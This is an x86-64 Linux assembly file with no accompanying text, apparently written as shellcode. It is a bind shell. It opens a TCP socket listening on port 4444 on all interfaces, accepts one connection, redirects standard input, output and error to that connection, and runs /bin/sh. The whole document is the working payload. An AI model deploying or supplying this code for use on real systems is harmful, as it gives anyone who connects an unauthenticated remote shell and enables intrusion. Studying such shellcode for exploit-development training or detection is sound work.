global _start

section .text

_start:
    mov al, 41
    mov dil, 2
    mov sil, 1
    xor rdx, rdx    
    syscall
    
    ; copy socket descriptor to rdi for future use
    mov rdi, rax

    xor rax, rax

    ; sockaddr_in struct
    push rax

    mov dword [rsp-4], eax
    mov word [rsp-6], 0x5c11
    mov al, 0x2
    mov word [rsp-8], ax 
    sub rsp, 8

    ; syscall number 49 (bind)

    mov al, 49
    mov rsi, rsp
    mov dl, 16
    syscall

    ; syscall number 50 (listen)

    mov al, 50
    mov sil, 2
    syscall

    ; syscall number 43 (accept)

    mov al, 43
    sub rsp, 16
    mov rsi, rsp ; arg2
    mov byte [rsp-1], 16
    sub rsp, 1
    mov rdx, rsp
    syscall

    ; store the client fd

    mov r9, rax
    
    ; syscall number 3 (close)
    mov al, 3
    syscall

    mov rdi, r9

    ; syscall number 33 (dup2)
    mov al, 33
    xor rsi, rsi
    syscall

    mov al, 33
    mov sil, 1
    syscall

    mov al, 33
    mov sil, 2
    syscall

    ; execve args

    xor rax, rax
    push rax

    mov rbx, 0x68732f2f6e69622f
    push rbx

    mov rdi, rsp

    push rax
    mov rdx, rsp 

    push rdi
    mov rsi, rsp

    ; syscall number 59 (execve)
    add rax, 59
    syscall
